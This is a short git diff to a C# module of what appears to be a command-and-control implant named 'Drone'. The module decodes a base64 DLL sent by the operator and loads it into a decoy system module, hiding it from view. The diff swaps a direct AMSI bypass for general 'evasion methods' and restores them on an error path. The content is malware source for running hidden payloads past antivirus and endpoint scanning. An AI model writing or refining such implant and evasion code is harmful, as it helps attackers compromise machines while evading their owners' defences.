@@ -6,7 +6,6 @@ using System.Threading;
 using Drone.Models;
 using Drone.DInvoke.DynamicInvoke;
 using Drone.DInvoke.ManualMap;
-using Drone.SharpSploit.Evasion;
 
 namespace Drone.Modules
 {
@@ -25,7 +24,7 @@ namespace Drone.Modules
 
         private void OverloadNativeDll(DroneTask task, CancellationToken token)
         {
-            Evasion.BypassAmsi();
+            Evasion.DeployEvasionMethods();
 
             var dll = Convert.FromBase64String(task.Artefact);
             var decoy = Overload.FindDecoyModule(dll.Length);
@@ -33,6 +32,7 @@ namespace Drone.Modules
             if (string.IsNullOrEmpty(decoy))
             {
                 Drone.SendError(task.TaskGuid, "Unable to find a suitable decoy module ");
+                Evasion.RestoreEvasionMethods();
                 return;
             }
 
@@ -51,7 +51,7 @@ namespace Drone.Modules
                 typeof(GenericDelegate),
                 funcParams);
             
-            Evasion.RestoreAmsi();
+            Evasion.RestoreEvasionMethods();
 
             Drone.SendResult(task.TaskGuid, result);
         }
